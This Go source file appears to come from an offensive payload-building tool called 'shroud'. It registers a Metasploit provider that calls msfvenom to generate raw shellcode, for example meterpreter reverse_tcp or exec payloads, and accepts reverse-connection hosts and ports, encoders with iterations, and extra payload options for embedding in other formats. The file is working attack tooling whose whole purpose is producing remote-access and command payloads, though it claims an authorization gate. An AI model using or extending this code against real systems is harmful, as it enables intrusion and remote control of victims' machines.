// Package metasploit implements a c2.Provider backed by the Metasploit
// `msfvenom` payload generator. This is the realistic "generate shellcode from
// Metasploit" path: msfvenom compiles a framework payload (meterpreter, exec,
// shell_reverse_tcp, …) into a position-independent blob that shroud then
// wraps/embeds in the chosen output format.
//
// The heavier msfrpc / msfrpcd path (driving a live Metasploit RPC server for
// staged generation + session-aware payloads) is intentionally deferred — it
// pulls in a msgpack client and a running msfrpcd. msfvenom covers the common
// "generate a PIC blob from the framework" need with zero server state. When
// you need it, add a sibling `msfrpc` provider implementing c2.Provider.
//
// Reached only through `shroud generate --c2 metasploit`, which is gated behind
// `shroud authorize`. See SECURITY.md — authorized use only.
package metasploit

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"shroud/internal/c2"

	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

const providerName = "metasploit"

// provider implements c2.Provider.
type provider struct{}

func (provider) Name() string { return providerName }

func (provider) Help() string {
	return "Metasploit — PIC shellcode via `msfvenom` (--msf-payload, --msf-lhost, --msf-lport, --msf-encoder, --msf-iterations, --msf-extra)."
}

// AddFlags registers msfvenom's flags on a flag set (scoped to `generate`).
func (provider) AddFlags(fs *pflag.FlagSet) {
	fs.String("msf-payload", "", "msfvenom payload, e.g. windows/x64/exec, windows/x64/meterpreter/reverse_tcp")
	fs.String("msf-lhost", "", "LHOST for msfvenom (reverse payloads)")
	fs.Int("msf-lport", 0, "LPORT for msfvenom (reverse payloads)")
	fs.String("msf-encoder", "", "msfvenom encoder (-e), e.g. x64/xor_dynamic")
	fs.Int("msf-iterations", 0, "msfvenom encoder iterations (-i); 0 = unset")
	fs.String("msf-arch", "x64", "msfvenom architecture (-a): x64|x86")
	fs.String("msf-format", "raw", "msfvenom output format (-f); raw = PIC bytes for embedding")
	fs.String("msf-platform", "windows", "msfvenom platform (-p platform)... only set if non-default")
	fs.String("msf-extra", "", "extra raw args appended to msfvenom (quoted), e.g. CMD=calc EXITFUNC=thread")
}

func (provider) Preflight(cmd *cobra.Command) error {
	if _, err := exec.LookPath("msfvenom"); err != nil {
		return fmt.Errorf("msfvenom not found on PATH — install metasploit-framework (or add it to PATH) for --c2 metasploit")
	}
	if payloadFlag(cmd) == "" {
		return errors.New("--msf-payload is required for --c2 metasploit (e.g. windows/x64/exec)")
	}
	return nil
}

func (p provider) Fetch(cmd *cobra.Command) (*c2.ShellcodeResult, error) {
	if err := p.Preflight(cmd); err != nil {
		return nil, err
	}
	args, payload, err := buildArgs(cmd)
	if err != nil {
		return nil, err
	}

	// Use a temp file via -o so stdout banner noise can never contaminate the
	// shellcode bytes (msfvenom -f raw to stdout is usually clean, but some
	// encoders/versions print a one-line preamble; -o avoids the whole class).
	tmp, err := os.MkdirTemp("", "shroud-msf-*")
	if err != nil {
		return nil, fmt.Errorf("mktemp: %w", err)
	}
	defer os.RemoveAll(tmp)
	outFile := filepath.Join(tmp, "shellcode.bin")
	args = append(args, "-o", outFile)

	bin, err := exec.LookPath("msfvenom")
	if err != nil {
		return nil, err
	}
	start := time.Now()
	c := exec.Command(bin, args...)
	c.Stdin = strings.NewReader("")
	out, err := c.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("msfvenom failed: %w\n%s", err, out)
	}
	data, err := os.ReadFile(outFile)
	if err != nil {
		return nil, fmt.Errorf("msfvenom produced no output (%s): %w", outFile, err)
	}
	if len(data) == 0 {
		return nil, fmt.Errorf("msfvenom output is empty\n%s", out)
	}
	return &c2.ShellcodeResult{
		Bytes:     data,
		SavePath:  outFile,
		Name:      payload,
		Source:    "metasploit:" + payload,
		BuildTime: time.Since(start).Round(time.Millisecond),
	}, nil
}

// buildArgs constructs the msfvenom argv from the provider flags. Returns the
// arg slice and the resolved payload name (for the Source label).
func buildArgs(cmd *cobra.Command) ([]string, string, error) {
	payload := payloadFlag(cmd)
	if payload == "" {
		return nil, "", errors.New("--msf-payload is required for --c2 metasploit")
	}
	arch := stringFlag(cmd, "msf-arch")
	format := stringFlag(cmd, "msf-format")
	if format == "" {
		format = "raw"
	}
	if arch == "" {
		arch = "x64"
	}

	var args []string
	args = append(args, "-p", payload, "-a", arch, "-f", format)

	platform := stringFlag(cmd, "msf-platform")
	if platform != "" {
		args = append(args, "--platform", platform)
	}

	// LHOST / LPORT (only meaningful for reverse payloads, but harmless to
	// pass to bind ones — msfvenom ignores options a payload doesn't use, EXCEPT
	// it errors if an option is set that the payload doesn't recognize. So only
	// inject them when the user actually set them).
	if lh := stringFlag(cmd, "msf-lhost"); lh != "" {
		args = append(args, "LHOST="+lh)
	}
	if lp := intFlag(cmd, "msf-lport"); lp != 0 {
		args = append(args, "LPORT="+strconv.Itoa(lp))
	}

	if enc := stringFlag(cmd, "msf-encoder"); enc != "" {
		args = append(args, "-e", enc)
	}
	if it := intFlag(cmd, "msf-iterations"); it > 0 {
		args = append(args, "-i", strconv.Itoa(it))
	}

	// Extra raw args (e.g. "CMD=calc EXITFUNC=thread"). Split on spaces; values
	// containing spaces must be quoted by the user. We do NOT shell-parse beyond
	// a naive whitespace split — msfvenom options are KEY=VAL tokens without
	// embedded spaces in practice.
	if extra := stringFlag(cmd, "msf-extra"); extra != "" {
		for _, a := range strings.Fields(extra) {
			args = append(args, a)
		}
	}
	return args, payload, nil
}

func payloadFlag(cmd *cobra.Command) string { return stringFlag(cmd, "msf-payload") }

func stringFlag(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}

func intFlag(cmd *cobra.Command, name string) int {
	v, _ := cmd.Flags().GetInt(name)
	return v
}

func init() {
	c2.Register(provider{})
}